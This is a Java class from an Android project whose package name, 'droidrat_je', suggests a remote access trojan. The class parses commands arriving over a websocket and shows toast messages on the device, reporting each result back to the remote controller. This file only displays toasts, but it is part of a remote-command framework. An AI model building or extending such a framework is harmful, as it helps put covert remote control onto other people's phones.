package com.je_chen.droidrat_je.command;

import android.content.Context;
import android.os.Looper;
import android.util.Log;

import com.je_chen.droidrat_je.command.process_super.CommandFather;
import com.je_chen.droidrat_je.command.process_super.CommandProcessInterface;
import com.je_chen.droidrat_je.modules.toast.Toastmaker;

import java.util.logging.Handler;

import static com.je_chen.droidrat_je.service.command.ProcessCommandService.websocket;


public class ToastCommand extends CommandFather implements CommandProcessInterface {

    private final String TAG = "Call Event ";

    private Toastmaker toastmaker;

    private Context context;

    public ToastCommand(Context context) {
        this.context = context;
        toastmaker = new Toastmaker(context);
    }

    @Override
    public void send(String value) {
        websocket.send(value);
    }

    @Override
    public void processCommand(String command) {
        try {
            String[] rawCommandArray = command.split(" ");
            switch (rawCommandArray[1]) {
                case "ToastN":
                    String message = rawCommandArray[2];
                    Log.d(TAG, "Toast maker:" + message);
                    toastmaker.makeToast(message);
                    this.send("Toast maker:" + message);
                    break;

                case "ToastD":
                    String message1 = rawCommandArray[2];
                    String direction1 = rawCommandArray[3];
                    Log.d(TAG, "Toast maker:" + message1 + " Direction:" + direction1);
                    toastmaker.makeToast(message1,direction1);
                    this.send("Toast maker:" + message1 + " Direction:" + direction1);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
